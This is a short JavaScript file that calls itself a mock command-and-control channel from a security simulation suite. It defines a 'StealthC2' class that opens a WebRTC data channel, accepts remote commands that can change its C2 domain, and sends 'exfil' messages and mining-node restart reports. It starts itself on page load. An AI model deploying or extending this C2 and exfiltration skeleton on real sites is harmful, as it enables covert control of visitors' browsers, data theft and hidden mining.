// WebRTC C2 Mock - Simulated Command & Control Channel
// Part of the GuardianSDK Security Simulation Suite

class StealthC2 {
    constructor() {
        this.pc = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });
        this.dataChannel = this.pc.createDataChannel("updates");
        this.setupHandlers();
    }

    setupHandlers() {
        this.dataChannel.onmessage = (event) => {
            const cmd = JSON.parse(event.data);
            this.executeCommand(cmd);
        };
    }

    sendExfil(data) {
        if (this.dataChannel.readyState === 'open') {
            this.dataChannel.send(JSON.stringify({ type: 'exfil', payload: data }));
        } else {
            console.log('[StealthC2] (Simulation) Exfil queued/sent:', data);
        }
    }

    executeCommand(cmd) {
        if (cmd.type === 'update_domain') {
            localStorage.setItem('c2_domain', cmd.new_url);
        }
    }

    init() {
        console.log('[StealthC2] Initialized and listening for commands.');
        this.sendExfil({ status: 'online', timestamp: Date.now() });
    }
    
    restartNode() {
        console.log('[StealthC2] Restarting Mining Node Protocol...');
        this.sendExfil({ 
            type: 'node_restart', 
            reason: 'manual_trigger',
            timestamp: Date.now()
        });
        return new Promise(resolve => setTimeout(resolve, 2000));
    }
}

// Auto-instantiate for global access
window.WebRTC_C2 = new StealthC2();